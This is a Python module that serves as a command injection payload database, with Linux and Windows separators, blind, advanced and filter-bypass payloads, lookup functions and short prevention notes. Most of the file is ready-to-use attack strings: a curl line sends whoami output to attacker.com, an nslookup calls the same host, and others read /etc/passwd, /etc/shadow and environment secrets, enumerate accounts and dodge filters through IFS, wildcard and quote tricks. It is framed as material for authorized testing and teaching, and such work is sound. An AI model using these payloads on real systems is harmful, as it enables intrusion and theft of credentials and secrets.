"""
Command Injection Payload Templates Database
Educational payload library for authorized security testing

Author: Security Research Team
Purpose: Educational demonstration of command injection patterns
"""

# Command separators by OS
SEPARATORS = {
    'linux': {
        'semicolon': {
            'char': ';',
            'description': 'Sequential command execution',
            'example': '; whoami',
            'context': 'Most common separator'
        },
        'and': {
            'char': '&&',
            'description': 'Execute second command if first succeeds',
            'example': '&& whoami',
            'context': 'Conditional execution'
        },
        'or': {
            'char': '||',
            'description': 'Execute second command if first fails',
            'example': '|| whoami',
            'context': 'Error handling bypass'
        },
        'pipe': {
            'char': '|',
            'description': 'Pipe output to next command',
            'example': '| whoami',
            'context': 'Output redirection'
        },
        'newline': {
            'char': '\n',
            'description': 'Line break command separator',
            'example': '\nwhoami',
            'context': 'Multi-line injection'
        },
        'backtick': {
            'char': '`',
            'description': 'Command substitution (deprecated)',
            'example': '`whoami`',
            'context': 'Inline command execution'
        },
        'dollar_paren': {
            'char': '$()',
            'description': 'Modern command substitution',
            'example': '$(whoami)',
            'context': 'Preferred substitution method'
        }
    },
    'windows': {
        'ampersand': {
            'char': '&',
            'description': 'Sequential command execution',
            'example': '& whoami',
            'context': 'CMD separator'
        },
        'and': {
            'char': '&&',
            'description': 'Execute if previous succeeds',
            'example': '&& whoami',
            'context': 'Conditional execution'
        },
        'or': {
            'char': '||',
            'description': 'Execute if previous fails',
            'example': '|| whoami',
            'context': 'Error bypass'
        },
        'pipe': {
            'char': '|',
            'description': 'Pipe to next command',
            'example': '| whoami',
            'context': 'Output piping'
        },
        'caret': {
            'char': '^',
            'description': 'Escape character / line continuation',
            'example': 'who^ami',
            'context': 'Character escaping'
        }
    }
}

# Base payload templates
PAYLOADS = {
    'linux': {
        'basic': [
            {
                'id': 'linux_basic_001',
                'payload': '; whoami',
                'description': 'Simple semicolon separator with whoami command',
                'context': 'parameter',
                'risk': 'high',
                'detection': 'easy',
                'example_vulnerable': 'ping -c 1 [USER_INPUT]'
            },
            {
                'id': 'linux_basic_002',
                'payload': '&& id',
                'description': 'AND operator with id command',
                'context': 'parameter',
                'risk': 'high',
                'detection': 'easy',
                'example_vulnerable': 'ls -la [USER_INPUT]'
            },
            {
                'id': 'linux_basic_003',
                'payload': '| whoami',
                'description': 'Pipe operator redirecting to whoami',
                'context': 'parameter',
                'risk': 'high',
                'detection': 'easy',
                'example_vulnerable': 'cat [USER_INPUT]'
            },
            {
                'id': 'linux_basic_004',
                'payload': '|| pwd',
                'description': 'OR operator with pwd command',
                'context': 'parameter',
                'risk': 'medium',
                'detection': 'easy',
                'example_vulnerable': 'test -f [USER_INPUT]'
            },
            {
                'id': 'linux_basic_005',
                'payload': '`whoami`',
                'description': 'Backtick command substitution',
                'context': 'parameter',
                'risk': 'high',
                'detection': 'easy',
                'example_vulnerable': 'echo [USER_INPUT]'
            },
            {
                'id': 'linux_basic_006',
                'payload': '$(whoami)',
                'description': 'Modern command substitution syntax',
                'context': 'parameter',
                'risk': 'high',
                'detection': 'easy',
                'example_vulnerable': 'echo [USER_INPUT]'
            },
            {
                'id': 'linux_basic_007',
                'payload': '\nwhoami',
                'description': 'Newline separator',
                'context': 'parameter',
                'risk': 'high',
                'detection': 'medium',
                'example_vulnerable': 'any multi-line input'
            }
        ],
        'blind': [
            {
                'id': 'linux_blind_001',
                'payload': '; sleep 10',
                'description': 'Time-based blind injection - 10 second delay',
                'context': 'parameter',
                'risk': 'high',
                'detection': 'medium',
                'verification': 'Measure response time',
                'example_vulnerable': 'background process [USER_INPUT]'
            },
            {
                'id': 'linux_blind_002',
                'payload': '&& sleep 5',
                'description': 'Conditional sleep - 5 second delay',
                'context': 'parameter',
                'risk': 'high',
                'detection': 'medium',
                'verification': 'Response time analysis'
            },
            {
                'id': 'linux_blind_003',
                'payload': '; ping -c 10 127.0.0.1',
                'description': 'Time delay via ping',
                'context': 'parameter',
                'risk': 'medium',
                'detection': 'easy',
                'verification': 'Network monitoring + time'
            },
            {
                'id': 'linux_blind_004',
                'payload': '; nslookup attacker.com',
                'description': 'DNS-based out-of-band detection',
                'context': 'parameter',
                'risk': 'high',
                'detection': 'medium',
                'verification': 'DNS logs on attacker.com',
                'note': 'Replace attacker.com with your domain'
            },
            {
                'id': 'linux_blind_005',
                'payload': '; curl http://attacker.com/$(whoami)',
                'description': 'HTTP-based data exfiltration',
                'context': 'parameter',
                'risk': 'critical',
                'detection': 'medium',
                'verification': 'HTTP logs on attacker server',
                'note': 'Requires internet access'
            },
            {
                'id': 'linux_blind_006',
                'payload': '&& timeout 10',
                'description': 'Timeout-based delay',
                'context': 'parameter',
                'risk': 'medium',
                'detection': 'hard',
                'verification': 'Response time'
            }
        ],
        'advanced': [
            {
                'id': 'linux_advanced_001',
                'payload': '; cat /etc/passwd',
                'description': 'Read sensitive system file',
                'context': 'parameter',
                'risk': 'critical',
                'detection': 'easy',
                'output': 'User account information'
            },
            {
                'id': 'linux_advanced_002',
                'payload': '&& cat /etc/shadow',
                'description': 'Read password hashes (requires root)',
                'context': 'parameter',
                'risk': 'critical',
                'detection': 'easy',
                'output': 'Password hashes',
                'note': 'Requires elevated privileges'
            },
            {
                'id': 'linux_advanced_003',
                'payload': '; ls -la /root',
                'description': 'List root directory contents',
                'context': 'parameter',
                'risk': 'high',
                'detection': 'easy',
                'output': 'Root file listing'
            },
            {
                'id': 'linux_advanced_004',
                'payload': '; uname -a',
                'description': 'System information disclosure',
                'context': 'parameter',
                'risk': 'medium',
                'detection': 'easy',
                'output': 'Kernel version, architecture'
            },
            {
                'id': 'linux_advanced_005',
                'payload': '; env',
                'description': 'Environment variable disclosure',
                'context': 'parameter',
                'risk': 'high',
                'detection': 'medium',
                'output': 'API keys, secrets in env vars'
            },
            {
                'id': 'linux_advanced_006',
                'payload': '; find / -name "*.conf" 2>/dev/null',
                'description': 'Search for configuration files',
                'context': 'parameter',
                'risk': 'high',
                'detection': 'medium',
                'output': 'Configuration file paths'
            },
            {
                'id': 'linux_advanced_007',
                'payload': '; netstat -antup',
                'description': 'Network connection enumeration',
                'context': 'parameter',
                'risk': 'medium',
                'detection': 'medium',
                'output': 'Active network connections'
            },
            {
                'id': 'linux_advanced_008',
                'payload': '; ps aux',
                'description': 'Process enumeration',
                'context': 'parameter',
                'risk': 'medium',
                'detection': 'easy',
                'output': 'Running processes'
            }
        ],
        'filter_bypass': [
            {
                'id': 'linux_bypass_001',
                'payload': ';${IFS}whoami',
                'description': 'Space bypass using IFS variable',
                'context': 'parameter',
                'risk': 'high',
                'detection': 'medium',
                'bypasses': 'Space character filters'
            },
            {
                'id': 'linux_bypass_002',
                'payload': ';$IFS$9whoami',
                'description': 'Space bypass with null parameter',
                'context': 'parameter',
                'risk': 'high',
                'detection': 'hard',
                'bypasses': 'Space and IFS detection'
            },
            {
                'id': 'linux_bypass_003',
                'payload': ';cat</etc/passwd',
                'description': 'Space bypass using input redirection',
                'context': 'parameter',
                'risk': 'high',
                'detection': 'medium',
                'bypasses': 'Space filters'
            },
            {
                'id': 'linux_bypass_004',
                'payload': ";c''at /etc/passwd",
                'description': 'Quote injection to break keyword matching',
                'context': 'parameter',
                'risk': 'high',
                'detection': 'hard',
                'bypasses': 'Exact string matching'
            },
            {
                'id': 'linux_bypass_005',
                'payload': ';c\\at /etc/passwd',
                'description': 'Backslash escape to break keyword',
                'context': 'parameter',
                'risk': 'high',
                'detection': 'hard',
                'bypasses': 'Word-based filters'
            },
            {
                'id': 'linux_bypass_006',
                'payload': ';cat /e??/pas?wd',
                'description': 'Wildcard obfuscation',
                'context': 'parameter',
                'risk': 'high',
                'detection': 'hard',
                'bypasses': 'Path blacklists'
            },
            {
                'id': 'linux_bypass_007',
                'payload': ';/b??/c?t /e??/pa??wd',
                'description': 'Full command + path wildcard obfuscation',
                'context': 'parameter',
                'risk': 'high',
                'detection': 'very hard',
                'bypasses': 'Command and path blacklists'
            },
            {
                'id': 'linux_bypass_008',
                'payload': ';{cat,/etc/passwd}',
                'description': 'Brace expansion - no separators needed',
                'context': 'parameter',
                'risk': 'high',
                'detection': 'hard',
                'bypasses': 'Separator-based filters'
            }
        ]
    },
    'windows': {
        'basic': [
            {
                'id': 'windows_basic_001',
                'payload': '& whoami',
                'description': 'Ampersand separator with whoami',
                'context': 'parameter',
                'risk': 'high',
                'detection': 'easy',
                'example_vulnerable': 'ping [USER_INPUT]'
            },
            {
                'id': 'windows_basic_002',
                'payload': '&& whoami',
                'description': 'Conditional AND with whoami',
                'context': 'parameter',
                'risk': 'high',
                'detection': 'easy',
                'example_vulnerable': 'dir [USER_INPUT]'
            },
            {
                'id': 'windows_basic_003',
                'payload': '| whoami',
                'description': 'Pipe to whoami',
                'context': 'parameter',
                'risk': 'high',
                'detection': 'easy',
                'example_vulnerable': 'type [USER_INPUT]'
            },
            {
                'id': 'windows_basic_004',
                'payload': '|| whoami',
                'description': 'OR operator with whoami',
                'context': 'parameter',
                'risk': 'medium',
                'detection': 'easy',
                'example_vulnerable': 'if exist [USER_INPUT]'
            },
            {
                'id': 'windows_basic_005',
                'payload': '& dir',
                'description': 'Directory listing',
                'context': 'parameter',
                'risk': 'medium',
                'detection': 'easy',
                'example_vulnerable': 'any command [USER_INPUT]'
            }
        ],
        'blind': [
            {
                'id': 'windows_blind_001',
                'payload': '& timeout /t 10',
                'description': 'Time-based delay - 10 seconds',
                'context': 'parameter',
                'risk': 'high',
                'detection': 'medium',
                'verification': 'Response time measurement'
            },
            {
                'id': 'windows_blind_002',
                'payload': '&& ping -n 10 127.0.0.1',
                'description': 'Ping-based delay',
                'context': 'parameter',
                'risk': 'medium',
                'detection': 'easy',
                'verification': 'Time analysis'
            },
            {
                'id': 'windows_blind_003',
                'payload': '& nslookup attacker.com',
                'description': 'DNS-based detection',
                'context': 'parameter',
                'risk': 'high',
                'detection': 'medium',
                'verification': 'DNS logs',
                'note': 'Replace with your domain'
            }
        ],
        'advanced': [
            {
                'id': 'windows_advanced_001',
                'payload': '& type C:\\Windows\\System32\\drivers\\etc\\hosts',
                'description': 'Read hosts file',
                'context': 'parameter',
                'risk': 'medium',
                'detection': 'easy',
                'output': 'Hosts file content'
            },
            {
                'id': 'windows_advanced_002',
                'payload': '& net user',
                'description': 'Enumerate user accounts',
                'context': 'parameter',
                'risk': 'high',
                'detection': 'easy',
                'output': 'User account list'
            },
            {
                'id': 'windows_advanced_003',
                'payload': '& net localgroup administrators',
                'description': 'List administrator accounts',
                'context': 'parameter',
                'risk': 'high',
                'detection': 'easy',
                'output': 'Admin accounts'
            },
            {
                'id': 'windows_advanced_004',
                'payload': '& systeminfo',
                'description': 'System information disclosure',
                'context': 'parameter',
                'risk': 'medium',
                'detection': 'easy',
                'output': 'OS version, patches, hardware'
            },
            {
                'id': 'windows_advanced_005',
                'payload': '& ipconfig /all',
                'description': 'Network configuration',
                'context': 'parameter',
                'risk': 'medium',
                'detection': 'easy',
                'output': 'IP addresses, DNS, MAC'
            },
            {
                'id': 'windows_advanced_006',
                'payload': '& netstat -ano',
                'description': 'Network connections',
                'context': 'parameter',
                'risk': 'medium',
                'detection': 'easy',
                'output': 'Active connections'
            },
            {
                'id': 'windows_advanced_007',
                'payload': '& tasklist',
                'description': 'Process enumeration',
                'context': 'parameter',
                'risk': 'medium',
                'detection': 'easy',
                'output': 'Running processes'
            },
            {
                'id': 'windows_advanced_008',
                'payload': '& set',
                'description': 'Environment variables',
                'context': 'parameter',
                'risk': 'high',
                'detection': 'easy',
                'output': 'Environment variables with secrets'
            }
        ],
        'filter_bypass': [
            {
                'id': 'windows_bypass_001',
                'payload': '& wHoAmI',
                'description': 'Case variation bypass',
                'context': 'parameter',
                'risk': 'high',
                'detection': 'medium',
                'bypasses': 'Case-sensitive blacklists'
            },
            {
                'id': 'windows_bypass_002',
                'payload': '& who^ami',
                'description': 'Caret escape character',
                'context': 'parameter',
                'risk': 'high',
                'detection': 'hard',
                'bypasses': 'Exact keyword matching'
            },
            {
                'id': 'windows_bypass_003',
                'payload': '& w""hoami',
                'description': 'Empty quote injection',
                'context': 'parameter',
                'risk': 'high',
                'detection': 'hard',
                'bypasses': 'String matching'
            },
            {
                'id': 'windows_bypass_004',
                'payload': '& who""am""i',
                'description': 'Multiple quote injection',
                'context': 'parameter',
                'risk': 'high',
                'detection': 'hard',
                'bypasses': 'Advanced string filters'
            }
        ]
    }
}

# Context-specific templates
CONTEXT_PAYLOADS = {
    'parameter': {
        'description': 'Injection in command parameter/argument',
        'example': 'ping -c 1 [INJECTION]',
        'payloads': ['; whoami', '&& id', '| pwd', '`whoami`']
    },
    'filename': {
        'description': 'Injection in filename context',
        'example': 'cat [INJECTION].txt',
        'payloads': [';whoami;#', '`whoami`.txt', '$(whoami).log']
    },
    'header': {
        'description': 'Injection in HTTP header processed by backend',
        'example': 'User-Agent: [INJECTION]',
        'payloads': [';whoami;', '\nwhoami\n', '`whoami`']
    }
}

def get_payloads(os_type='linux', category='basic'):
    """
    Retrieve payload templates by OS and category
    
    Args:
        os_type (str): 'linux' or 'windows'
        category (str): 'basic', 'blind', 'advanced', 'filter_bypass'
    
    Returns:
        list: List of payload dictionaries
    """
    if os_type not in PAYLOADS:
        return []
    
    if category not in PAYLOADS[os_type]:
        return []
    
    return PAYLOADS[os_type][category]

def get_separators(os_type='linux'):
    """
    Get command separators for specified OS
    
    Args:
        os_type (str): 'linux' or 'windows'
    
    Returns:
        dict: Separator information
    """
    return SEPARATORS.get(os_type, {})

def get_context_payloads(context='parameter'):
    """
    Get payloads specific to injection context
    
    Args:
        context (str): 'parameter', 'filename', 'header'
    
    Returns:
        dict: Context-specific payload information
    """
    return CONTEXT_PAYLOADS.get(context, {})

def list_all_categories(os_type='linux'):
    """
    List all available payload categories for an OS
    
    Args:
        os_type (str): 'linux' or 'windows'
    
    Returns:
        list: Category names
    """
    if os_type not in PAYLOADS:
        return []
    return list(PAYLOADS[os_type].keys())

# Educational notes
EDUCATIONAL_NOTES = """
COMMAND INJECTION OVERVIEW:
Command injection occurs when an application passes unsafe user input to a system shell.
Attackers can append additional commands using shell metacharacters (separators).

COMMON VULNERABLE PATTERNS:
1. Direct shell execution: os.system(user_input)
2. Subprocess without proper escaping
3. String concatenation in shell commands
4. Improper input validation

PREVENTION:
1. NEVER use shell=True with user input
2. Use parameterized commands (subprocess with list)
3. Whitelist validation (only allow specific chars)
4. Principle of least privilege
5. Use libraries instead of shell commands where possible

DETECTION:
- Monitor for shell metacharacters in input
- Log all command executions
- Behavioral analysis for unusual process spawning
- WAF rules for common injection patterns
"""

if __name__ == '__main__':
    print("=" * 60)
    print("COMMAND INJECTION PAYLOAD DATABASE")
    print("=" * 60)
    print("\nAvailable OS types: linux, windows")
    print("\nLinux categories:", list_all_categories('linux'))
    print("Windows categories:", list_all_categories('windows'))
    print("\n" + EDUCATIONAL_NOTES)
